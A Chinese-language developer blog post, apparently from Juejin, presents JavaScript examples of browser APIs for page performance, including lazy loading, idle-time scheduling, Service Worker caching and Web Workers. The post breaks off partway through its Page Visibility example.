content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            性能飞跃！这几个现代浏览器API让页面加载速度提升至90+
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3799545205237111/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    大知闲闲i
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T02:55:17.000Z" title="Tue Dec 09 2025 02:55:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>===</p>
<p>项目上线后，随着用户量增长，页面性能急剧下降？首屏加载超过3秒，滚动时频繁掉帧，甚至导致设备发烫？这些问题不仅影响用户体验，也直接影响业务转化率。</p>
<p>今天，我将分享在真实项目中验证有效的几个个浏览器API，帮助你将页面性能优化，让用户体验焕然一新。</p>
<h2 data-id="heading-0">1. IntersectionObserver：智能懒加载解决方案</h2>
<p>传统滚动监听方式会导致主线程阻塞，而IntersectionObserver将元素可见性判断交给浏览器，效率显著提升。</p>
<pre><code class="hljs language-ini" lang="ini">// 创建懒加载观察器
const <span class="hljs-attr">lazyLoadObserver</span> = new IntersectionObserver((entries) =&gt; {
  entries.forEach(<span class="hljs-attr">entry</span> =&gt; {
    if (entry.isIntersecting) {
      const <span class="hljs-attr">element</span> = entry.target<span class="hljs-comment">;</span>
      
      // 图片懒加载
      if (<span class="hljs-attr">element.tagName</span> === <span class="hljs-string">'IMG'</span>) {
        <span class="hljs-attr">element.src</span> = element.dataset.src<span class="hljs-comment">;</span>
      }
      
      // 组件懒加载
      if (element.dataset.module) {
        loadModule(element.dataset.module)<span class="hljs-comment">;</span>
      }
      
      // 停止观察已加载元素
      lazyLoadObserver.unobserve(element)<span class="hljs-comment">;</span>
    }
  })<span class="hljs-comment">;</span>
}, {
  rootMargin: '50px', // 提前50px开始加载
  threshold: 0.1
})<span class="hljs-comment">;</span>
​
// 初始化懒加载元素
document.querySelectorAll('<span class="hljs-section">[data-lazy]</span>').forEach(<span class="hljs-attr">el</span> =&gt; {
  lazyLoadObserver.observe(el)<span class="hljs-comment">;</span>
})<span class="hljs-comment">;</span>
</code></pre>
<p><strong>效果</strong>：首屏加载时间减少40%，滚动流畅度提升60%，CPU占用率降低30%。</p>
<h2 data-id="heading-1">2. requestIdleCallback：智能任务调度器</h2>
<p>将非关键任务推迟到浏览器空闲时段执行，避免阻塞用户交互。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 创建低优先级任务队列</span>
const lowPriorityTasks = <span class="hljs-selector-attr">[  () =&gt; sendAnalytics(<span class="hljs-string">'page_view'</span>),  () =&gt; prefetchNextPageResources(),  () =&gt; cleanUpOldCache(),]</span>;
​
<span class="hljs-comment">// 在空闲时段执行任务</span>
function <span class="hljs-built_in">scheduleIdleTasks</span>() {
  <span class="hljs-built_in">requestIdleCallback</span>((deadline) =&gt; {
    while (deadline.timeRemaining() &gt; <span class="hljs-number">0</span> &amp;&amp; lowPriorityTasks<span class="hljs-selector-class">.length</span> &gt; <span class="hljs-number">0</span>) {
      const task = lowPriorityTasks<span class="hljs-selector-class">.shift</span>();
      <span class="hljs-built_in">task</span>();
    }
    
    <span class="hljs-comment">// 如果还有任务未执行，继续调度</span>
    if (lowPriorityTasks.length &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-built_in">scheduleIdleTasks</span>();
    }
  }, { timeout: <span class="hljs-number">2000</span> }); <span class="hljs-comment">// 最长等待2秒</span>
}
​
<span class="hljs-comment">// 页面加载完成后开始调度</span>
window<span class="hljs-selector-class">.addEventListener</span>('load', scheduleIdleTasks);
</code></pre>
<h2 data-id="heading-2">3. requestAnimationFrame：流畅动画的保证</h2>
<p>告别<code>setTimeout</code>卡顿，让动画与屏幕刷新率完美同步。</p>
<pre><code class="hljs language-ini" lang="ini">class SmoothAnimator {
  constructor(element, <span class="hljs-attr">duration</span> = <span class="hljs-number">300</span>) {
    <span class="hljs-attr">this.element</span> = element<span class="hljs-comment">;</span>
    <span class="hljs-attr">this.duration</span> = duration<span class="hljs-comment">;</span>
    <span class="hljs-attr">this.startTime</span> = null<span class="hljs-comment">;</span>
  }
  
  animate(property, startValue, endValue) {
    const <span class="hljs-attr">animateFrame</span> = (currentTime) =&gt; {
      if (!this.startTime) <span class="hljs-attr">this.startTime</span> = currentTime<span class="hljs-comment">;</span>
      
      const <span class="hljs-attr">elapsed</span> = currentTime - this.startTime<span class="hljs-comment">;</span>
      const <span class="hljs-attr">progress</span> = Math.min(elapsed / this.duration, <span class="hljs-number">1</span>)<span class="hljs-comment">;</span>
      
      // 使用缓动函数提升动画质感
      const <span class="hljs-attr">easedProgress</span> = this.easeOutCubic(progress)<span class="hljs-comment">;</span>
      const <span class="hljs-attr">currentValue</span> = startValue + (endValue - startValue) * easedProgress<span class="hljs-comment">;</span>
      
      this.element.style<span class="hljs-section">[property]</span> = currentValue<span class="hljs-comment">;</span>
      
      if (progress &lt; 1) {
        requestAnimationFrame(animateFrame)<span class="hljs-comment">;</span>
      }
    }<span class="hljs-comment">;</span>
    
    requestAnimationFrame(animateFrame)<span class="hljs-comment">;</span>
  }
  
  easeOutCubic(t) {
    return 1 - Math.pow(1 - t, 3)<span class="hljs-comment">;</span>
  }
}
​
// 使用示例
const <span class="hljs-attr">animator</span> = new SmoothAnimator(document.getElementById(<span class="hljs-string">'box'</span>))<span class="hljs-comment">;</span>
animator.animate('translateX', 0, 300)<span class="hljs-comment">;</span>
</code></pre>
<h2 data-id="heading-3">4. ResizeObserver：响应式设计的利器</h2>
<p>精确监听元素尺寸变化，告别不必要的全局重排。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ResponsiveComponent</span> {
  <span class="hljs-keyword">constructor</span>(container) {
    <span class="hljs-keyword">this</span>.container = container;
    <span class="hljs-keyword">this</span>.resizeObserver = new ResizeObserver(<span class="hljs-keyword">this</span>.handleResize.bind(<span class="hljs-keyword">this</span>));
    <span class="hljs-keyword">this</span>.resizeObserver.observe(container);
    
    <span class="hljs-comment">// 防抖处理，避免频繁触发</span>
    <span class="hljs-keyword">this</span>.debouncedResize = <span class="hljs-keyword">this</span>.debounce(<span class="hljs-keyword">this</span>.updateLayout, <span class="hljs-number">100</span>);
  }
  
  handleResize(entries) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> entry of entries) {
      <span class="hljs-keyword">const</span> { width, height } = entry.contentRect;
      
      <span class="hljs-comment">// 只有尺寸发生显著变化时才更新</span>
      <span class="hljs-keyword">if</span> (Math.abs(width - <span class="hljs-keyword">this</span>.lastWidth) &gt; <span class="hljs-number">10</span> || 
          Math.abs(height - <span class="hljs-keyword">this</span>.lastHeight) &gt; <span class="hljs-number">10</span>) {
        <span class="hljs-keyword">this</span>.debouncedResize(width, height);
        <span class="hljs-keyword">this</span>.lastWidth = width;
        <span class="hljs-keyword">this</span>.lastHeight = height;
      }
    }
  }
  
  updateLayout(width, height) {
    <span class="hljs-comment">// 根据新尺寸更新布局</span>
    <span class="hljs-keyword">if</span> (width &lt; <span class="hljs-number">768</span>) <span class="hljs-keyword">this</span>.applyMobileLayout();
    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (width &lt; <span class="hljs-number">1024</span>) <span class="hljs-keyword">this</span>.applyTabletLayout();
    <span class="hljs-keyword">else</span> <span class="hljs-keyword">this</span>.applyDesktopLayout();
  }
  
  debounce(fn, delay) {
    let timer;
    <span class="hljs-keyword">return</span> (...args) =&gt; {
      clearTimeout(timer);
      timer = setTimeout(() =&gt; fn.apply(<span class="hljs-keyword">this</span>, args), delay);
    };
  }
}
</code></pre>
<h2 data-id="heading-4">5. performance API：精准性能监控系统</h2>
<p>构建完整的性能监控体系，找出真正的性能瓶颈。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">PerformanceMonitor</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
  }
  
  <span class="hljs-comment">// 标记关键时间点</span>
  <span class="hljs-title function_">mark</span>(<span class="hljs-params">name</span>) {
    performance.<span class="hljs-title function_">mark</span>(<span class="hljs-string">`<span class="hljs-subst">${name}</span>-start`</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-title function_">set</span>(name, {
      <span class="hljs-attr">start</span>: performance.<span class="hljs-title function_">now</span>(),
      <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>
    });
  }
  
  <span class="hljs-comment">// 测量性能指标</span>
  <span class="hljs-title function_">measure</span>(<span class="hljs-params">metricName, startMark, endMark</span>) {
    performance.<span class="hljs-title function_">measure</span>(metricName, startMark, endMark);
    
    <span class="hljs-keyword">const</span> measures = performance.<span class="hljs-title function_">getEntriesByName</span>(metricName);
    <span class="hljs-keyword">const</span> lastMeasure = measures[measures.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>];
    
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${metricName}</span>: <span class="hljs-subst">${lastMeasure.duration.toFixed(<span class="hljs-number">2</span>)}</span>ms`</span>);
    
    <span class="hljs-comment">// 上报到监控系统</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">reportMetric</span>(metricName, lastMeasure.<span class="hljs-property">duration</span>);
  }
  
  <span class="hljs-comment">// 监控长任务</span>
  <span class="hljs-title function_">monitorLongTasks</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> observer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PerformanceObserver</span>(<span class="hljs-function">(<span class="hljs-params">list</span>) =&gt;</span> {
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> entry <span class="hljs-keyword">of</span> list.<span class="hljs-title function_">getEntries</span>()) {
        <span class="hljs-keyword">if</span> (entry.<span class="hljs-property">duration</span> &gt; <span class="hljs-number">50</span>) { <span class="hljs-comment">// 超过50ms的任务</span>
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">'长任务警告:'</span>, entry);
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">optimizeLongTask</span>(entry);
        }
      }
    });
    
    observer.<span class="hljs-title function_">observe</span>({ <span class="hljs-attr">entryTypes</span>: [<span class="hljs-string">'longtask'</span>] });
  }
  
  <span class="hljs-comment">// 监控首次输入延迟</span>
  <span class="hljs-title function_">monitorFID</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> observer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PerformanceObserver</span>(<span class="hljs-function">(<span class="hljs-params">list</span>) =&gt;</span> {
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> entry <span class="hljs-keyword">of</span> list.<span class="hljs-title function_">getEntries</span>()) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'首次输入延迟:'</span>, entry.<span class="hljs-property">processingStart</span> - entry.<span class="hljs-property">startTime</span>);
      }
    });
    
    observer.<span class="hljs-title function_">observe</span>({ <span class="hljs-attr">entryTypes</span>: [<span class="hljs-string">'first-input'</span>] });
  }
}
</code></pre>
<h2 data-id="heading-5">6. 智能预加载策略</h2>
<p>结合preload和prefetch，打造无缝加载体验。</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- 关键CSS立即加载 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"preload"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"critical.css"</span> <span class="hljs-attr">as</span>=<span class="hljs-string">"style"</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">"this.rel='stylesheet'"</span>&gt;</span>
  
  <span class="hljs-comment">&lt;!-- 首屏必要字体 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"preload"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"fonts.woff2"</span> <span class="hljs-attr">as</span>=<span class="hljs-string">"font"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"font/woff2"</span> <span class="hljs-attr">crossorigin</span>&gt;</span>
  
  <span class="hljs-comment">&lt;!-- 首屏必要图片 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"preload"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"hero-image.jpg"</span> <span class="hljs-attr">as</span>=<span class="hljs-string">"image"</span>&gt;</span>
  
  <span class="hljs-comment">&lt;!-- 非关键CSS异步加载 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"prefetch"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"non-critical.css"</span> <span class="hljs-attr">as</span>=<span class="hljs-string">"style"</span>&gt;</span>
  
  <span class="hljs-comment">&lt;!-- 预加载下一页资源 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"prefetch"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"next-page.js"</span> <span class="hljs-attr">as</span>=<span class="hljs-string">"script"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"prefetch"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"next-page-data.json"</span> <span class="hljs-attr">as</span>=<span class="hljs-string">"fetch"</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>

// 动态预加载
class ResourcePreloader {
  constructor() {
    this.visibleLinks = new Set();
    this.initIntersectionObserver();
  }
  
  initIntersectionObserver() {
    const observer = new IntersectionObserver((entries) =&gt; {
      entries.forEach(entry =&gt; {
        if (entry.isIntersecting) {
          const link = entry.target.href;
          if (!this.visibleLinks.has(link)) {
            this.prefetchResource(link);
            this.visibleLinks.add(link);
          }
        }
      });
    });
    
    // 监听页面内所有链接
    document.querySelectorAll('a[href^="/"]').forEach(link =&gt; {
      observer.observe(link);
    });
  }
  
  prefetchResource(url) {
    // 创建prefetch链接
    const link = document.createElement('link');
    link.rel = 'prefetch';
    link.href = url;
    link.as = this.getResourceType(url);
    document.head.appendChild(link);
  }
  
  getResourceType(url) {
    if (url.endsWith('.js')) return 'script';
    if (url.endsWith('.css')) return 'style';
    if (url.endsWith('.json')) return 'fetch';
    return 'fetch';
  }
}
</code></pre>
<h2 data-id="heading-6">7. Cache API + Service Worker：离线优先架构</h2>
<p>构建可靠的离线缓存策略，提升重复访问性能。</p>
<pre><code class="hljs language-ini" lang="ini">// service-worker.js
const <span class="hljs-attr">CACHE_VERSION</span> = <span class="hljs-string">'v1.3'</span><span class="hljs-comment">;</span>
const <span class="hljs-attr">CACHE_NAME</span> = `app-cache-<span class="hljs-variable">${CACHE_VERSION}</span>`<span class="hljs-comment">;</span>
​
// 静态资源缓存策略
const <span class="hljs-attr">STATIC_RESOURCES</span> = [
  <span class="hljs-string">'/'</span>,
  <span class="hljs-string">'/index.html'</span>,
  <span class="hljs-string">'/main.css'</span>,
  <span class="hljs-string">'/app.js'</span>,
  <span class="hljs-string">'/manifest.json'</span>
]<span class="hljs-comment">;</span>
​
// 安装阶段：缓存核心资源
self.addEventListener('install', <span class="hljs-attr">event</span> =&gt; {
  event.waitUntil(
    caches.open(CACHE_NAME)
      .then(<span class="hljs-attr">cache</span> =&gt; cache.addAll(STATIC_RESOURCES))
      .then(() =&gt; self.skipWaiting())
  )<span class="hljs-comment">;</span>
})<span class="hljs-comment">;</span>
​
// 激活阶段：清理旧缓存
self.addEventListener('activate', <span class="hljs-attr">event</span> =&gt; {
  event.waitUntil(
    caches.keys().then(<span class="hljs-attr">cacheNames</span> =&gt; {
      return Promise.all(
        cacheNames.map(<span class="hljs-attr">cacheName</span> =&gt; {
          if (cacheName !== CACHE_NAME) {
            return caches.delete(cacheName)<span class="hljs-comment">;</span>
          }
        })
      )<span class="hljs-comment">;</span>
    }).then(() =&gt; self.clients.claim())
  )<span class="hljs-comment">;</span>
})<span class="hljs-comment">;</span>
​
// 请求拦截：智能缓存策略
self.addEventListener('fetch', <span class="hljs-attr">event</span> =&gt; {
  const <span class="hljs-attr">request</span> = event.request<span class="hljs-comment">;</span>
  
  // 忽略非GET请求
  if (request.method !== 'GET') return<span class="hljs-comment">;</span>
  
  // 忽略chrome-extension等特殊协议
  if (!request.url.startsWith('http')) return<span class="hljs-comment">;</span>
  
  event.respondWith(
    caches.match(request).then(<span class="hljs-attr">cachedResponse</span> =&gt; {
      // 网络优先，缓存兜底策略
      const <span class="hljs-attr">fetchPromise</span> = fetch(request).then(networkResponse =&gt; {
        // 如果是成功响应，更新缓存
        if (networkResponse.ok) {
          const <span class="hljs-attr">clone</span> = networkResponse.clone()<span class="hljs-comment">;</span>
          caches.open(CACHE_NAME).then(<span class="hljs-attr">cache</span> =&gt; {
            cache.put(request, clone)<span class="hljs-comment">;</span>
          })<span class="hljs-comment">;</span>
        }
        return networkResponse<span class="hljs-comment">;</span>
      }).catch(() =&gt; {
        // 网络失败，返回缓存
        if (cachedResponse) return cachedResponse<span class="hljs-comment">;</span>
        
        // 连缓存也没有，返回离线页面
        return caches.match('/offline.html')<span class="hljs-comment">;</span>
      })<span class="hljs-comment">;</span>
      
      return cachedResponse || fetchPromise<span class="hljs-comment">;</span>
    })
  )<span class="hljs-comment">;</span>
})<span class="hljs-comment">;</span>
</code></pre>
<h2 data-id="heading-7">8. Web Workers：复杂计算的后台处理</h2>
<p>将CPU密集型任务移出主线程，保持UI响应性。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 主线程：任务管理</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ComputationManager</span> {
  <span class="hljs-keyword">constructor</span>() {
    <span class="hljs-keyword">this</span>.worker = new Worker(<span class="hljs-string">'compute.worker.js'</span>);
    <span class="hljs-keyword">this</span>.callbacks = new Map();
    <span class="hljs-keyword">this</span>.taskId = <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">this</span>.worker.onmessage = (event) =&gt; {
      <span class="hljs-keyword">const</span> { taskId, result, type } = event.<span class="hljs-keyword">data</span>;
      
      <span class="hljs-keyword">if</span> (type === <span class="hljs-string">'result'</span> &amp;&amp; <span class="hljs-keyword">this</span>.callbacks.has(taskId)) {
        <span class="hljs-keyword">const</span> { resolve, reject } = <span class="hljs-keyword">this</span>.callbacks.<span class="hljs-keyword">get</span>(taskId);
        resolve(result);
        <span class="hljs-keyword">this</span>.callbacks.delete(taskId);
      }
    };
    
    <span class="hljs-keyword">this</span>.worker.onerror = (error) =&gt; {
      console.error(<span class="hljs-string">'Worker error:'</span>, error);
      <span class="hljs-comment">// 错误处理逻辑</span>
    };
  }
  
  <span class="hljs-comment">// 提交计算任务</span>
  submitTask(<span class="hljs-keyword">data</span>, transferable = []) {
    <span class="hljs-keyword">return</span> new Promise((resolve, reject) =&gt; {
      <span class="hljs-keyword">const</span> taskId = ++<span class="hljs-keyword">this</span>.taskId;
      
      <span class="hljs-keyword">this</span>.callbacks.<span class="hljs-keyword">set</span>(taskId, { resolve, reject });
      
      <span class="hljs-keyword">this</span>.worker.postMessage(
        { taskId, <span class="hljs-keyword">data</span> },
        transferable.length ? transferable : undefined
      );
    });
  }
  
  <span class="hljs-comment">// 批量处理大量数据</span>
  async processLargeDataset(dataset) {
    <span class="hljs-comment">// 分割数据，避免单次处理过大</span>
    <span class="hljs-keyword">const</span> chunkSize = <span class="hljs-number">1000</span>;
    <span class="hljs-keyword">const</span> chunks = [];
    
    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; dataset.length; i += chunkSize) {
      chunks.push(dataset.slice(i, i + chunkSize));
    }
    
    <span class="hljs-comment">// 并行处理所有分块</span>
    <span class="hljs-keyword">const</span> results = await Promise.all(
      chunks.map(chunk =&gt; <span class="hljs-keyword">this</span>.submitTask(chunk))
    );
    
    <span class="hljs-comment">// 合并结果</span>
    <span class="hljs-keyword">return</span> results.flat();
  }
}
​
<span class="hljs-comment">// Worker线程：专注计算</span>
<span class="hljs-comment">// compute.worker.js</span>
self.onmessage = function(event) {
  <span class="hljs-keyword">const</span> { taskId, <span class="hljs-keyword">data</span> } = event.<span class="hljs-keyword">data</span>;
  
  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// 执行复杂计算</span>
    <span class="hljs-keyword">const</span> result = performHeavyComputation(<span class="hljs-keyword">data</span>);
    
    <span class="hljs-comment">// 返回结果</span>
    self.postMessage({
      taskId,
      type: <span class="hljs-string">'result'</span>,
      result
    });
  } <span class="hljs-keyword">catch</span> (error) {
    self.postMessage({
      taskId,
      type: <span class="hljs-string">'error'</span>,
      error: error.message
    });
  }
};
​
function performHeavyComputation(<span class="hljs-keyword">data</span>) {
  <span class="hljs-comment">// 复杂的计算逻辑</span>
  <span class="hljs-comment">// 例如：数据排序、图像处理、加密解密等</span>
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">data</span>.map(item =&gt; transform(item));
}
</code></pre>
<h2 data-id="heading-8">9. Page Visibility API：智能资源管理</h2>
<p>根据页面可见状态优化资源使用，提升能效表现。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ResourceManager</span> {
  <span class="hljs-keyword">constructor</span>() {
    <span class="hljs-keyword">this</span>.timers = new Map();
    <span class="hljs-keyword">this</span>.connections = new Set();
    <span class="hljs-keyword">this</span>.isVisible = <span class="hljs-literal">true</span>;
    
    <span class="hljs-keyword">this</span>.initVisibilityListener();
    <span class="hljs-keyword">this</span>.initPerformanceMonitor();
  }
  
  initVisibilityListener() {
    document.addEventListener(<span class="hljs-string">'visibilitychange'</span>, () =&gt; {
      <span class="hljs-keyword">this</span>.isVisible = document.visibilityState === <span class="hljs-string">'visible'</span>;
      
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.isVisible) {
        <span class="hljs-keyword">this</span>.onPageShow();
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">this</span>.onPageHide();
      }
    });
    
    <span class="hljs-comment">// 监听页面关闭前事件</span>
    window.addEventListener(<span class="hljs-string">'beforeunload'</span>, () =&gt; {
      <span class="hljs-keyword">this</span>.cleanup();
    });
  }
  
  onPageHide() {
    console.log(<span class="hljs-string">'页面进入后台，开始节流'</span>);
    
    <span class="hljs-comment">// 暂停视频和音频</span>
    <span class="hljs-keyword">this</span>.pauseMediaElements();
    
    <span class="hljs-comment">// 降低定时器频率</span>
    <span class="hljs-keyword">this</span>.throttleTimers();
    
    <span class="hljs-comment">// 暂停WebSocket连接</span>
    <span class="hljs-keyword">this</span>.pauseConnections();
    
    <span class="hljs-comment">// 停止动画</span>
    <span class="hljs-keyword">this</span>.pauseAnimations();
  }
  
  onPageShow() {
    console.log(<span class="hljs-string">'页面回到前台，恢复功能'</span>);
    
    <span class="hljs-comment">// 恢复媒体播放</span>
    <span class="hljs-keyword">this</span>.resumeMediaElements();
    
    <span class="hljs-comment">// 恢复定时器</span>
    <span class="hljs-keyword">this</span>.restoreTimers();
    
    <span class="hljs-comment">// 恢复连接</span>
    <span class="hljs-keyword">this</span>.resumeConnections();
    
    <span class="hljs-comment">// 同步数据</span>
    <span class="hljs-keyword">this</span>.syncData();
  }
  
  <span class="hljs-comment">// 智能定时器管理</span>
  createSmartTimer(callback, interval, options = {}) {
    <span class="hljs-keyword">const</span> timerId = Symbol(<span class="hljs-string">'timer'</span>);
    let lastRun = <span class="hljs-number">0</span>;
    
